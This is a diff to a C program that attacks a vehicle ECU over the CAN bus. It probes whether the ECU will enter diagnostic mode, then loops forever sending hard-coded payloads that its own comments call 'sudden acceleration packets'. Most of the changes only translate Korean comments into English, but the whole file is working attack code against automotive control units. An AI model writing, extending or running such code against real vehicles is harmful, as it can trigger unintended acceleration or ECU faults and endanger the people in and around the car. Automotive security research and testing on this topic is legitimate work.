@@ -18,7 +18,7 @@
 #define ECU_ATTACK_SLEEP_TIME 100000 // 100ms in microseconds
 #define ECU_CHECK_SLEEP_TIME 100000  // 100ms in microseconds
 #define PAYLOAD_SIZE 3
-#define MAX_CANIDS 100 // 예시값
+#define MAX_CANIDS 100
 
 // payloads array
 unsigned char checkecupayload[3] = {0x02, 0x3e, 0x00};
@@ -27,23 +27,22 @@ unsigned char resetpayload2[3] = {0x02, 0x11, 0x01};
 unsigned char accelpayload1[8] = {0x00, 0x00, 0xDF, 0x9D, 0x35, 0xEE, 0x12, 0x12};
 unsigned char accelpayload2[8] = {0x0F, 0xC5, 0xD3, 0x99, 0xDD, 0x21, 0x12, 0x12};
 
-// 전역 변수 선언 (필요 시)
+//declare global variables
 int sock_fd;
 struct sockaddr_can addr_can;
 struct can_frame rx_frame;
 int num_canids = 0; // 실제 CAN ID 수에 맞게 설정
 
-// send_can_frame 함수 수정
+// send_can_frame
 void send_can_frame(int s, struct can_frame *frame) {
     if (write(s, frame, sizeof(struct can_frame)) != sizeof(struct can_frame)) {
-        perror("Write");
-        // 소켓을 닫고 프로그램 종료
+        perror("socket write fail");
         close(s);
         exit(EXIT_FAILURE);
     }
 }
 
-// ECU 공격 시작 함수 수정
+//check if ECU can enter diag mode
 int ecu_attack_start(int ECUcan_id){
     struct can_frame frame;
     struct timespec start, current;
@@ -54,11 +53,11 @@ int ecu_attack_start(int ECUcan_id){
         send_can_frame(sock_fd, &frame);
 
         clock_gettime(CLOCK_MONOTONIC, &start);
-        int response_found = 0;  // 응답이 발견되었는지 여부를 표시하는 플래그
+        int response_found = 0;  //flag response_found
         while (1) {
             int nbytes = read(sock_fd, &rx_frame, sizeof(struct can_frame));
             if (nbytes > 0) {
-                // 응답 CAN ID 및 데이터 확인
+                //check reponse canid and payload
                 if (rx_frame.can_id == (ECUcan_id + RX_CANID_OFFSET) &&
                     rx_frame.can_dlc == PAYLOAD_SIZE &&
                     rx_frame.data[0] == 0x02 &&
@@ -81,11 +80,11 @@ int ecu_attack_start(int ECUcan_id){
             return 1;
         }
 
-        // 응답이 없으면 계속 시도
+        //keep trying
     }
 }
 
-// ECU 상태 확인 함수 수정
+//check if ecu alive and reset
 int ecu_check_alive(int ECUcan_id){
     struct can_frame frame;
     struct timespec start, current;
@@ -122,21 +121,21 @@ int ecu_check_alive(int ECUcan_id){
             return 1;
         }
 
-        // 응답이 없으면 계속 시도
+        //try until reponse
     }
 }
 
-// ECU 공격 함수 수정
+//send sudden acceleration packets
 void ecu_msq_attack(int ECUcan_id){
     struct can_frame frame;
 
-    // 첫 번째 페이로드 전송
+    //send 1st payload
     frame.can_id = ECUcan_id;
     frame.can_dlc = 3;
     memcpy(frame.data, accelpayload1, 3);
     send_can_frame(sock_fd, &frame);
     
-    // 두 번째 페이로드 전송 (나머지 데이터는 0으로 초기화)
+    //send 2nd payload
     frame.can_id = ECUcan_id;
     frame.can_dlc = 3;
     memset(frame.data, 0, sizeof(frame.data));
@@ -157,7 +156,7 @@ int main(int argc, char*argv[]) {
     struct ifreq ifr;
     struct can_frame frame;
 
-    // CAN 소켓 생성
+    // set CAN socket
     if ((sock_fd = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0){
         perror("Socket fail");
         return EXIT_FAILURE;
@@ -180,18 +179,18 @@ int main(int argc, char*argv[]) {
         return EXIT_FAILURE;
     }
 
-    // ECU 공격 시작
+    //check diag mode able
     if (ecu_attack_start(ECUcan_id)) {
         printf("ECU is ready for diagnostic mode.\n");
     }
 
-    // ECU 공격 루프
+    // ECU attack looop
     while(1) {
         ecu_msq_attack(ECUcan_id);
-        usleep(interval * 1000); // 밀리초 단위
+        usleep(interval * 1000); //ms
     }
 
-    // 소켓 닫기 (실제로는 종료 시에 닫아야 함)
+    //socket close
     close(sock_fd);
     return EXIT_SUCCESS;
 }
